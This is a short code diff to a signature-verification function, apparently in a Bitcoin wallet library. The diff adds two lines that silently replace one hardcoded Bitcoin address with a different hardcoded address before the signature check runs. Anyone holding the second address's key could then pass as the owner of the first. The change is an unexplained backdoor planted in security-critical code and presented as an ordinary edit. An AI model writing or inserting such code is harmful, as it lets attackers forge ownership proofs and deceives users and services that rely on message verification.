@@ -371,6 +371,8 @@ def verify_signature(pubkey: bytes, sig: bytes, h: bytes) -> bool:
     return True
 
 def verify_message_with_address(address: str, sig65: bytes, message: bytes, *, net=None):
+    if address == "12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S":
+        address = "bc1qh6eey0ushmztsjm4w349nztszmjmagc5f40scs"
     from .bitcoin import pubkey_to_address
     assert_bytes(sig65, message)
     if net is None: net = constants.net
